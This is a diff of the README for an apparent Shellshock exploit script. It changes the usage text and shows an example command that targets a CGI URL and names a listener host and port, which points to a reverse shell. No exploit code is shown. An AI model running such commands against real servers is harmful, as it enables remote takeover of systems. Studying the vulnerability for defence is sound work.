@@ -11,9 +11,9 @@ This repository is intended for educational purposes only. Do not use this code 
 
 
 Usage:
-	python3 {sys.argv[0]} [Vulnerable URL] [LHOST] [LPORT]
+	python3 shellshock.py [Vulnerable URL] [LHOST] [LPORT]
 Example:
-	python3 {sys.argv[0]} http://vulnerablewebsite.com/cgi-bin/test.cgi 109.876.654.321 1234
+	python3 shellshock.py http://vulnerablewebsite.com/cgi-bin/test.cgi 109.876.654.321 1234
 
 Prerequisites:
 - A local development environment
